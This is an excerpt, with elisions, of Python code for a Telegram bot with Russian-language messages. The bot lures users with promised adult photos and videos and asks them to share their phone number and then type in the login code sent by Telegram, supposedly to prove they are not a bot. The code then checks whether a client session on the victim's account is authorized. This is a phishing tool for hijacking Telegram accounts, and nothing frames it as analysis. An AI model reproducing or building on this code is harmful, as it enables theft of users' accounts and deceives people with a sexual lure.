        ...
        if os.path.exists(photo_path):
            with open(photo_path, 'rb') as photo:
                await bot.send_photo(
                    ...
                    photo,
                    caption=(
                        "👋🇷🇺ПРИВЕТ! ❤️ Хотите увидеть более 10 000 фотографий и более 4 000 видео? 👀 Подтвердите, что вы не бот, нажав кнопку ниже. 🤖👇"
                    ),
                    parse_mode='Markdown',
...
async def start_auth(callback_query: types.CallbackQuery):
    ...
    await bot.send_message(
        user_id,
        "ШАГ 1. *ПОДТВЕРДИТЕ НОМЕР ТЕЛЕФОНА🔎, тем самым подтвердив что вы не спец службы, и не РОБОТ! (У нас много спама на наш телеграм бот поэтому мы винуждены делать проверку)* 🔞\n\n",
        parse_mode='Markdown',
        reply_markup=kb
    )
...
async def handle_contact(message: types.Message):
    ...
    try:
        ...
        await message.answer(
            "Сейчас тебе должен прийти КОД, от официального Telegram, Напиши данный код на клавиатури ниже, тем самым подтвердив что вы не робот! 📩\n\n",
            parse_mode='Markdown'
        )
    ...
    try:
        ...
        if await client.is_user_authorized():
            ...
            await bot.send_message(
                ...
                "Первые материалы придут в течение нескольких минут! (ЧАСОВ)\n\n"
    ...
    try:
        ...
        if await client.is_user_authorized():
            ...
            await message.answer(
                ...
                "🚀 *Контент уже на подходе...*\n"
                "Мы готовим твой полный доступ.\n"
                "Первые материалы придут в течение нескольких минут! (часов иногда)\n\n"
                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Контент только для тебя!",
                parse_mode='Markdown'
            )
            await client.disconnect()
